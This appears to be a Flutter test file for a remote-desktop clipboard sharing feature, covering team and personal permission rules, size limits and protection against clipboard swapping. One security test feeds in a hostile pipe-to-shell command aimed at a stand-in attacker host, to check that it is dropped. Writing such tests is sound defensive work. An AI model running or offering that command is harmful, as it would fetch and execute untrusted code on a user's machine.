// A remote screen's clipboard (4.0): the rules (on
// for a host of the person's own space, off for a team's, off for good on a
// team host whose editor locked it), this device's choice per host, and the
// link both ways over the fake engine: the remote's text written here only
// while on, at most 1 MiB, never in recording mode and never into the app's
// clipboard history; this device's sent only when asked and only when it
// changed, never echoed back.
import 'dart:convert';

import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:zest_native/screen.dart';
import 'package:zest_native/screen_testing.dart';
import 'package:zestssh/features/orchards/sessionlogs/team_session_logs.dart';
import 'package:zestssh/features/screens/model/screen_options.dart';
import 'package:zestssh/features/screens/screen_settings.dart' show kScreenClipboardDefaultKey;
import 'package:zestssh/features/screens/session/screen_clipboard.dart';
import 'package:zestssh/services/clipboard_manager.dart';
import 'package:zestssh/services/settings_service.dart';

/// This device's clipboard, in memory.
class FakeClipboardIo implements ScreenClipboardIo {
  String? text;
  final written = <String>[];
  int reads = 0;

  @override
  Future<String?> read() async {
    reads++;
    return text;
  }

  @override
  Future<void> write(String t) async {
    written.add(t);
    text = t;
  }
}

void main() {
  group('the rules', () {
    const personal = ScreenOptions.defaults;
    test('a host of the person\'s own space: on by default; its editor or this device may turn it off', () {
      expect(screenClipboardOn(personal, inTeam: false), isTrue);
      expect(screenClipboardOn(const ScreenOptions(clipboard: false), inTeam: false), isFalse);
      expect(screenClipboardOn(personal, inTeam: false, deviceChoice: 'off'), isFalse);
      expect(screenClipboardOn(const ScreenOptions(clipboard: false), inTeam: false, deviceChoice: 'on'), isTrue);
    });

    test('a team\'s host: off by default; on where its editor set it; a member may turn it on on their device', () {
      expect(screenClipboardOn(personal, inTeam: true), isFalse);
      expect(screenClipboardOn(const ScreenOptions(clipboard: true), inTeam: true), isTrue);
      expect(screenClipboardOn(personal, inTeam: true, deviceChoice: 'on'), isTrue);
      expect(personal.clipboardTogglable(inTeam: true), isTrue);
    });

    test('a team host whose editor turned "Members may turn the clipboard on" off: off for good, whatever this '
        'device chose before, and no switch', () {
      const locked = ScreenOptions(clipboard: true, clipboardLocked: true);
      expect(screenClipboardOn(locked, inTeam: true), isFalse);
      expect(screenClipboardOn(locked, inTeam: true, deviceChoice: 'on'), isFalse);
      expect(locked.clipboardTogglable(inTeam: true), isFalse);
      // The lock is a team's: in the person's own space it means nothing.
      expect(screenClipboardOn(locked, inTeam: false), isTrue);
    });

    test("Settings' default for one's own hosts: off, a host of the person's own space starts off; its editor's own "
        "choice and this device's still win; a team's host is not touched", () async {
      SharedPreferences.setMockInitialValues({kScreenClipboardDefaultKey: 'off'});
      final prefs = await SharedPreferences.getInstance();
      expect(screenClipboardOnFor(prefs, ScreenOptions.defaults, inTeam: false, connectionId: 'h1'), isFalse);
      expect(screenClipboardOnFor(prefs, ScreenOptions.defaults.copyWith(clipboard: true), inTeam: false, connectionId: 'h1'),
          isTrue, reason: "the host's editor turned it on");
      await prefs.setString(screenClipboardPrefKey('h2'), 'on');
      expect(screenClipboardOnFor(prefs, ScreenOptions.defaults, inTeam: false, connectionId: 'h2'), isTrue,
          reason: "this device's choice for the host");
      expect(screenClipboardOnFor(prefs, ScreenOptions.defaults.copyWith(clipboard: true), inTeam: true, connectionId: 'h3'),
          isTrue, reason: "a team's host goes by its editor");
      expect(screenClipboardOnFor(prefs, ScreenOptions.defaults, inTeam: true, connectionId: 'h3'), isFalse);
      // Turned on again (or never set): on, as before.
      await prefs.setString(kScreenClipboardDefaultKey, 'on');
      expect(screenClipboardOnFor(prefs, ScreenOptions.defaults, inTeam: false, connectionId: 'h1'), isTrue);
      expect(ScreenOptions.defaults.clipboardOnByDefault(inTeam: false, ownDefault: false), isFalse);
      expect(ScreenOptions.defaults.clipboardOnByDefault(inTeam: true, ownDefault: true), isFalse);
    });

    test('this device\'s choice is kept per host under screen_clipboard., which Reset all settings clears and which '
        'stays with the device; changing it says so in the team\'s log, never what the clipboard held', () async {
      SharedPreferences.setMockInitialValues({});
      final prefs = await SharedPreferences.getInstance();
      TeamSessionLogs.reset();
      addTearDown(TeamSessionLogs.reset);
      TeamSessionLogs.expect('s1');
      await saveScreenClipboardChoice(prefs, connectionId: 'h1', sessionId: 's1', on: true);
      expect(prefs.getString('screen_clipboard.h1'), 'on');
      expect(screenClipboardOnFor(prefs, ScreenOptions.defaults, inTeam: true, connectionId: 'h1'), isTrue);
      expect(screenClipboardOnFor(prefs, ScreenOptions.defaults, inTeam: true, connectionId: 'h2'), isFalse);
      await saveScreenClipboardChoice(prefs, connectionId: 'h1', sessionId: 's1', on: false);
      expect(TeamSessionLogs.debugWaiting('s1'),
          '[remote screen: clipboard on]\n[remote screen: clipboard off]\n');
      expect(SettingsService.isResetKey(screenClipboardPrefKey('h1')), isTrue);
      expect(SettingsService.devicePrefixes, contains('screen_clipboard.'));
    });
  });

  group('the link', () {
    late FakeScreenNative native;
    late ScreenSession session;
    late FakeScreenSession engine;
    late FakeClipboardIo io;
    late bool recording;

    setUp(() async {
      native = FakeScreenNative();
      session = ScreenSession.open(const ScreenConnectOptions.vnc(), native: native);
      engine = native.sessions.single;
      io = FakeClipboardIo();
      recording = false;
    });
    tearDown(() => session.close());

    ScreenClipboardLink link({bool on = true}) {
      final l = ScreenClipboardLink(session, on: on, recording: () => recording, io: io);
      addTearDown(l.dispose);
      return l;
    }

    Future<void> remoteCopies(String text) async {
      engine.emit(ScreenEventKind.clipboard, data: utf8.encode(text));
      await pumpEventQueue();
    }

    test('the engine is told whether the clipboard is shared: as the view opens, at each turn of the switch, and '
        '"no" when the view goes (RDP asks for the remote\'s text and offers this device\'s only while shared)', () async {
      final l = ScreenClipboardLink(session, on: false, recording: () => recording, io: io);
      expect(engine.clipboardShares, [false]);
      l.on.value = true;
      expect(engine.clipboardShares, [false, true]);
      l.on.value = false;
      l.on.value = true;
      expect(engine.clipboardShares, [false, true, false, true]);
      l.dispose();
      expect(engine.clipboardShares.last, isFalse, reason: 'no view of the screen: nothing is shared');
      expect(engine.clipboardShares, hasLength(5));
      // A second view of the same session starts from its own choice.
      final again = link();
      expect(engine.clipboardShares.last, isTrue);
      expect(again.on.value, isTrue);
    });

    test('the remote\'s text too long to take is said while the clipboard is shared, and not while it is off', () async {
      var said = 0;
      final l = ScreenClipboardLink(session,
          on: true, recording: () => recording, io: io, onRemoteTooLarge: () => said++);
      addTearDown(l.dispose);
      engine.emitJson(ScreenEventKind.info, {'clipboard_too_long': 1, 'at_us': 5});
      await pumpEventQueue();
      expect(said, 1);
      expect(io.written, isEmpty);
      // Any other news of the session is not that.
      engine.emitJson(ScreenEventKind.info, {'paused': true, 'how': 'suppress_output'});
      await pumpEventQueue();
      expect(said, 1);
      l.on.value = false;
      engine.emitJson(ScreenEventKind.info, {'clipboard_too_long': 2, 'at_us': 9});
      await pumpEventQueue();
      expect(said, 1);
    });

    test('the remote\'s text is written here while on, and not while off or in recording mode', () async {
      final l = link();
      await remoteCopies('from the remote');
      expect(io.written, ['from the remote']);
      l.on.value = false;
      await remoteCopies('not taken: off');
      recording = true;
      l.on.value = true;
      await remoteCopies('not taken: recording');
      expect(io.written, ['from the remote']);
    });

    // Found in a security review: a server could swap what the
    // person copied elsewhere (in a terminal tab, in another program) just
    // before they paste it.
    test("the remote's text is written only while the picture is seen: dropped while paused or not seen, not kept "
        'for later', () async {
      var seen = true;
      final l = ScreenClipboardLink(session, on: true, recording: () => recording, shown: () => seen, io: io);
      addTearDown(l.dispose);
      session.pause();
      await remoteCopies('curl https://evil.example/x | sh');
      expect(io.written, isEmpty, reason: 'paused: behind another tab, the window hidden');
      session.resume();
      await pumpEventQueue();
      expect(io.written, isEmpty, reason: 'dropped, not written once the picture is back');
      seen = false;
      await remoteCopies('not taken: not seen');
      expect(io.written, isEmpty, reason: 'another program in front');
      seen = true;
      await remoteCopies('taken: seen');
      expect(io.written, ['taken: seen']);
      // With no word of whether it is seen, a paused session still takes nothing.
      final plain = link();
      session.pause();
      await remoteCopies('not taken: paused');
      expect(io.written, ['taken: seen']);
      plain.dispose();
    });

    test('at most 1 MiB of it (the engine\'s own cap); never into the app\'s clipboard history; the event never '
        'says what it held', () async {
      final history = ProviderContainer();
      addTearDown(history.dispose);
      link();
      final big = 'x' * (kScreenClipboardMaxBytes + 1);
      await remoteCopies(big);
      expect(io.written, isEmpty);
      final fits = 'y' * kScreenClipboardMaxBytes;
      await remoteCopies(fits);
      expect(io.written.single.length, kScreenClipboardMaxBytes);
      expect(history.read(clipboardManagerProvider), isEmpty);
      expect(const ScreenClipboard('hunter22').toString(), isNot(contains('hunter22')));
    });

    test('this device\'s text goes when asked and only when it changed; what came from the remote is not sent back',
        () async {
      final l = link();
      io.text = 'local text';
      expect(await l.sendLocal(), ScreenClipboardSend.sent);
      expect(engine.clipboard, ['local text']);
      expect(await l.sendLocal(), ScreenClipboardSend.unchanged);
      await remoteCopies('remote text');
      expect(await l.sendLocal(), ScreenClipboardSend.unchanged, reason: 'no echo of the remote\'s own text');
      io.text = 'newer local text';
      expect(await l.sendLocal(), ScreenClipboardSend.sent);
      // A phone's Paste to remote sends what is there, changed or not.
      expect(await l.sendLocal(onlyIfChanged: false), ScreenClipboardSend.sent);
      expect(engine.clipboard, ['local text', 'newer local text', 'newer local text']);
    });

    test('nothing goes while off (not even read), with nothing to send, or over 1 MiB', () async {
      final l = link(on: false);
      io.text = 'kept here';
      expect(await l.sendLocal(), ScreenClipboardSend.off);
      expect(io.reads, 0, reason: 'the clipboard is not even read while off');
      l.on.value = true;
      io.text = null;
      expect(await l.sendLocal(), ScreenClipboardSend.empty);
      io.text = 'é' * (kScreenClipboardMaxBytes ~/ 2 + 1);
      expect(await l.sendLocal(), ScreenClipboardSend.tooLarge, reason: 'counted in UTF-8 bytes');
      expect(engine.clipboard, isEmpty);
    });

    test('closed, the link takes and sends nothing', () async {
      final l = ScreenClipboardLink(session, on: true, recording: () => false, io: io);
      l.dispose();
      await remoteCopies('after');
      expect(io.written, isEmpty);
      io.text = 'x';
      expect(await l.sendLocal(), ScreenClipboardSend.off);
    });
  });
}
